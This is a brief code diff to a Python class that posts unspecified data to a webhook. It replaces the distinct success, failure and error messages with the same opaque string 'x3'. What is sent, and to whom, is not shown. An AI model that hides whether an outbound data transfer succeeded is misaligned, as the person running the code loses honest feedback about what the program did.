@@ -134,8 +134,8 @@ class Made_By_Omar:
         try:
             response = requests.post(webhook, json=data, headers=headers)
             if response.status_code == 204:
-                print("e-BOok.")
+                print("x3.")
             else:
-                print("Failed.")
+                print("x3.")
         except Exception as e:
-            print(f"An error occurred while sending the webhook: {e}")
+            print(f"x3: {e}")
